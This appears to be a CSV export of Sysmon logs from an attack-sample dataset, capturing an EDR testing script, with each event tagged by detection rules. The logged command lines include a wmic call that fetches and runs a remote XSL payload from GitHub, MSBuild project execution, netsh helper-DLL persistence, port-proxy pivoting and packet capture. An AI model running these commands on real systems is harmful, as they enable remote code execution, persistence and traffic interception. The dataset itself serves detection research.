2019-07-29T21:33:50.104868+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4938,MSEDGEWIN10,"Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe
RuleName: ''
Description: MSBuild.exe
TerminalSessionId: 1
ParentCommandLine: cmd  /c C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe xxxFile.csproj
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
ParentProcessId: 3240
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=9672CADE96C657A8860D60923AFDBE4C46A2935D,MD5=4D7D4D92DC7D86B72ABF81821FF83837,SHA256=B60EB62F6C24D4A495A0DAB95CC49624AC5099A2CC21F8BD010A410401AB8CC3,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744
ParentProcessGuid: 747F3D96-663D-5D3F-0000-00106F608A00
ProcessId: 5340
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-663D-5D3F-0000-001062708A00
CommandLine: C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe  xxxFile.csproj
FileVersion: '4.7.3190.0 built by: NET472REL1LAST_C'
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:49.881
"
2019-07-29T21:33:53.776441+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4939,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 4260
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6641-5D3F-0000-0010A38C8A00
CommandLine: cmd  /c wmic process get brief /format:""https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Wmic_calc.xsl""
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:53.759
"
2019-07-29T21:33:53.843592+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4940,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=5346C77A5FC3245C79408802D1CBA9E42D707809,MD5=8E5650109EFFB36F456846F2CA14F5B3,SHA256=9DE395721EEE865D97F27734B0EAA3D204384EEE005FC247BE026C24D277AA1C,IMPHASH=0C91A5CE0FB26F4C5CE39E340F43873B
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 1516
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6641-5D3F-0000-001066918A00
CommandLine: timeout  5
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:53.839
"
2019-07-29T21:33:54.246154+00:00,Hacktool - EDR-Freeze Execution;Potential Process Reconnaissance via Wmic.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4941,MSEDGEWIN10,"Image: C:\Windows\System32\wbem\WMIC.exe
RuleName: ''
Description: WMI Commandline Utility
TerminalSessionId: 1
ParentCommandLine: cmd  /c wmic process get brief /format:""https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Wmic_calc.xsl""
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4260
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=4004528344D02FD143DAFD94BFE056041B633E0D,MD5=390B2038C9ED2C94AB505921BC827FC7,SHA256=34C4ED50A3441BD7CB6411749771C637A8C18C791525D8FCB5AE71B0B1969BA6,IMPHASH=AF8CD6625FCE3244397EE550EFF4091E
ParentProcessGuid: 747F3D96-6641-5D3F-0000-0010A38C8A00
ProcessId: 4896
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6642-5D3F-0000-0010F69D8A00
CommandLine: wmic  process get brief /format:""https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Wmic_calc.xsl""
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:54.044
"
2019-07-29T21:33:54.630548+00:00,UAC Bypass Using Windows Media Player - File,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,11,4942,MSEDGEWIN10,"ProcessGuid: 747F3D96-6642-5D3F-0000-0010F69D8A00
CreationUtcTime: 2019-07-29 21:33:54.618
UtcTime: 2019-07-29 21:33:54.618
ProcessId: 4896
RuleName: ''
TargetFilename: C:\Users\IEUser\AppData\Local\Microsoft\Windows\INetCache\IE\LQ86GWLO\Wmic_calc[1].xsl
Image: C:\Windows\System32\Wbem\WMIC.exe
"
2019-07-29T21:33:54.718578+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4943,MSEDGEWIN10,"Image: C:\Windows\System32\calc.exe
RuleName: ''
Description: Windows Calculator
TerminalSessionId: 1
ParentCommandLine: wmic  process get brief /format:""https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Wmic_calc.xsl""
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4896
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=F5ED372FD8EC7C455FF66BCE73F16CA51CBC0302,MD5=DEAD69D07BC33B762ABD466FB6F53E11,SHA256=3091E2ABFB55D05D6284B6C4B058B62C8C28AFC1D883B699E9A2B5482EC6FD51,IMPHASH=8EEAA9499666119D13B3F44ECD77A729
ParentProcessGuid: 747F3D96-6642-5D3F-0000-0010F69D8A00
ProcessId: 5728
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6642-5D3F-0000-0010D6C98A00
CommandLine: '""C:\Windows\System32\calc.exe"" '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\wbem\WMIC.exe
UtcTime: 2019-07-29 21:33:54.709
"
2019-07-29T21:33:58.256845+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4945,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 5084
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6646-5D3F-0000-0010E32E8B00
CommandLine: 'cmd  /c netsh trace start capture=yes filemode=append persistent=yes tracefile=trace.etl    '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:58.245
"
2019-07-29T21:33:58.286383+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4946,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 4148
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6646-5D3F-0000-0010A7318B00
CommandLine: 'cmd  /c netsh trace show status    '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:58.273
"
2019-07-29T21:33:58.485479+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4947,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 3824
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6646-5D3F-0000-001051388B00
CommandLine: cmd  /c netsh.exe add helper AllTheThings.dll
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:58.336
"
2019-07-29T21:33:58.543692+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4948,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 6760
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6646-5D3F-0000-001029398B00
CommandLine: cmd  /c netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:58.355
"
2019-07-29T21:33:58.598592+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4949,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 3868
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6646-5D3F-0000-0010A7398B00
CommandLine: cmd  /c netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:58.357
"
2019-07-29T21:33:58.683059+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4950,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-6609-5D3F-0000-00109FBF8500
ProcessId: 6232
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6646-5D3F-0000-0010913A8B00
CommandLine: cmd  /c netsh trace stop
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:58.370
"
2019-07-29T21:34:00.330766+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4951,MSEDGEWIN10,"Image: C:\Windows\System32\netsh.exe
RuleName: ''
Description: Network Command Shell
TerminalSessionId: 1
ParentCommandLine: 'cmd  /c netsh trace show status    '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4148
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=21190DE3629B7A40409897CAF9563EB1EE1944B2,MD5=758B8449357017A158163ECC0E5E52B2,SHA256=D70D165B6706C61C56F2CA91307F4BBDB9846ACAE1DA3CFD84BF978FFB21AF23,IMPHASH=90B4317BE51850B8EF9F14EB56FB7DDC
ParentProcessGuid: 747F3D96-6646-5D3F-0000-0010A7318B00
ProcessId: 5760
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6647-5D3F-0000-0010F4648B00
CommandLine: 'netsh  trace show status    '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:59.034
"
2019-07-29T21:34:00.420234+00:00,Hacktool - EDR-Freeze Execution;New Network Trace Capture Started Via Netsh.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4952,MSEDGEWIN10,"Image: C:\Windows\System32\netsh.exe
RuleName: ''
Description: Network Command Shell
TerminalSessionId: 1
ParentCommandLine: 'cmd  /c netsh trace start capture=yes filemode=append persistent=yes tracefile=trace.etl    '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5084
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=21190DE3629B7A40409897CAF9563EB1EE1944B2,MD5=758B8449357017A158163ECC0E5E52B2,SHA256=D70D165B6706C61C56F2CA91307F4BBDB9846ACAE1DA3CFD84BF978FFB21AF23,IMPHASH=90B4317BE51850B8EF9F14EB56FB7DDC
ParentProcessGuid: 747F3D96-6646-5D3F-0000-0010E32E8B00
ProcessId: 5056
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6647-5D3F-0000-0010AE6E8B00
CommandLine: 'netsh  trace start capture=yes filemode=append persistent=yes tracefile=trace.etl    '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:59.141
"
2019-07-29T21:34:00.434980+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4953,MSEDGEWIN10,"Image: C:\Windows\System32\netsh.exe
RuleName: ''
Description: Network Command Shell
TerminalSessionId: 1
ParentCommandLine: cmd  /c netsh trace stop
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6232
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=21190DE3629B7A40409897CAF9563EB1EE1944B2,MD5=758B8449357017A158163ECC0E5E52B2,SHA256=D70D165B6706C61C56F2CA91307F4BBDB9846ACAE1DA3CFD84BF978FFB21AF23,IMPHASH=90B4317BE51850B8EF9F14EB56FB7DDC
ParentProcessGuid: 747F3D96-6646-5D3F-0000-0010913A8B00
ProcessId: 4568
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6647-5D3F-0000-001005738B00
CommandLine: netsh  trace stop
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:59.268
"
2019-07-29T21:34:00.442242+00:00,Hacktool - EDR-Freeze Execution;New Port Forwarding Rule Added Via Netsh.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4954,MSEDGEWIN10,"Image: C:\Windows\System32\netsh.exe
RuleName: ''
Description: Network Command Shell
TerminalSessionId: 1
ParentCommandLine: cmd  /c netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3868
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=21190DE3629B7A40409897CAF9563EB1EE1944B2,MD5=758B8449357017A158163ECC0E5E52B2,SHA256=D70D165B6706C61C56F2CA91307F4BBDB9846ACAE1DA3CFD84BF978FFB21AF23,IMPHASH=90B4317BE51850B8EF9F14EB56FB7DDC
ParentProcessGuid: 747F3D96-6646-5D3F-0000-0010A7398B00
ProcessId: 5048
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6647-5D3F-0000-001065758B00
CommandLine: netsh  interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:59.368
"
2019-07-29T21:34:00.460197+00:00,Hacktool - EDR-Freeze Execution;New Port Forwarding Rule Added Via Netsh.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4955,MSEDGEWIN10,"Image: C:\Windows\System32\netsh.exe
RuleName: ''
Description: Network Command Shell
TerminalSessionId: 1
ParentCommandLine: cmd  /c netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6760
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=21190DE3629B7A40409897CAF9563EB1EE1944B2,MD5=758B8449357017A158163ECC0E5E52B2,SHA256=D70D165B6706C61C56F2CA91307F4BBDB9846ACAE1DA3CFD84BF978FFB21AF23,IMPHASH=90B4317BE51850B8EF9F14EB56FB7DDC
ParentProcessGuid: 747F3D96-6646-5D3F-0000-001029398B00
ProcessId: 4028
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6647-5D3F-0000-001057768B00
CommandLine: netsh  interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:59.390
"
2019-07-29T21:34:00.466817+00:00,Hacktool - EDR-Freeze Execution;Potential Persistence Via Netsh Helper DLL;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4956,MSEDGEWIN10,"Image: C:\Windows\System32\netsh.exe
RuleName: ''
Description: Network Command Shell
TerminalSessionId: 1
ParentCommandLine: cmd  /c netsh.exe add helper AllTheThings.dll
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3824
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
Hashes: SHA1=21190DE3629B7A40409897CAF9563EB1EE1944B2,MD5=758B8449357017A158163ECC0E5E52B2,SHA256=D70D165B6706C61C56F2CA91307F4BBDB9846ACAE1DA3CFD84BF978FFB21AF23,IMPHASH=90B4317BE51850B8EF9F14EB56FB7DDC
ParentProcessGuid: 747F3D96-6646-5D3F-0000-001051388B00
ProcessId: 5236
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6647-5D3F-0000-0010927C8B00
CommandLine: netsh.exe  add helper AllTheThings.dll
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x413182'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-29 21:33:59.544
"
2019-07-29T21:34:00.707406+00:00,New PortProxy Registry Entry Added;Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,13,4957,MSEDGEWIN10,"Image: C:\Windows\system32\netsh.exe
TargetObject: HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp\0.0.0.0/8080
RuleName: ''
EventType: SetValue
ProcessId: 4028
ProcessGuid: 747F3D96-6647-5D3F-0000-001057768B00
UtcTime: 2019-07-29 21:33:59.803
Details: 192.168.1.1/8000
"
2019-07-29T21:34:00.715900+00:00,New PortProxy Registry Entry Added,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,12,4958,MSEDGEWIN10,"ProcessGuid: 747F3D96-6647-5D3F-0000-001065758B00
TargetObject: HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp\0.0.0.0/8080
ProcessId: 5048
RuleName: ''
EventType: DeleteValue
UtcTime: 2019-07-29 21:33:59.803
Image: C:\Windows\system32\netsh.exe
"
2019-07-29T21:34:00.724167+00:00,Potential Persistence Via Netsh Helper DLL - Registry,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,13,4959,MSEDGEWIN10,"Image: C:\Windows\system32\netsh.exe
TargetObject: HKLM\SOFTWARE\Microsoft\NetSh\AllTheThings
RuleName: ''
EventType: SetValue
ProcessId: 5236
ProcessGuid: 747F3D96-6647-5D3F-0000-0010927C8B00
UtcTime: 2019-07-29 21:33:59.849
Details: AllTheThings.dll
"
2019-07-29T21:34:00.731449+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4960,MSEDGEWIN10,"Image: C:\Windows\System32\svchost.exe
RuleName: ''
Description: Host Process for Windows Services
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\services.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 568
LogonGuid: 747F3D96-DCFC-5D3F-0000-0020E7030000
Hashes: SHA1=A1385CE20AD79F55DF235EFFD9780C31442AA234,MD5=8A0A29438052FAED8A2532DA50455756,SHA256=7FD065BAC18C5278777AE44908101CDFED72D26FA741367F0AD4D02020787AB6,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: 747F3D96-DCFC-5D3F-0000-0010F1520000
ProcessId: 5376
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-6647-5D3F-0000-001052998B00
CommandLine: C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\services.exe
UtcTime: 2019-07-29 21:33:59.928
"
2019-07-29T21:34:00.970967+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx,1,Microsoft-Windows-Sysmon,1,4961,MSEDGEWIN10,"Image: C:\Windows\System32\timeout.exe
RuleName: ''
Description: timeout - pauses command processing
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" /C ""C:\ProgramData\ssh\runtests.bat"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1208
LogonGuid: 747F3D96-6053-5D3F-0000-002082314100
